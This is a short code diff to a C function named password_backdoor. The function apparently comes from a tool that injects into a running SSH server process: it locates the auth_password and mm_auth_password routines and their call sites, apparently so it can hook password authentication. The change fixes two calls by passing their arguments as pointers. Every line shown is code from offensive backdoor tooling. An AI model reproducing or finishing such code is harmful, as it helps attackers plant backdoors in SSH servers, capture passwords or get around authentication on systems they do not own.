@@ -226,8 +226,8 @@ void password_backdoor(inject_ctx *ctx) {
 	mm_auth_password = resolve_call_insn(ctx, privsep_test+4+privsep_jnz[1]);
 	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
 	
-	n_auth_password_calls = find_calls(auth_password_calls, auth_password);
-	n_mm_auth_password_calls = find_calls(mm_auth_password_calls, mm_auth_password);
+	n_auth_password_calls = find_calls(&auth_password_calls, auth_password);
+	n_mm_auth_password_calls = find_calls(&mm_auth_password_calls, mm_auth_password);
 	
 	if (n_auth_password_calls == 0)
 		error("No calls to auth_password found.");
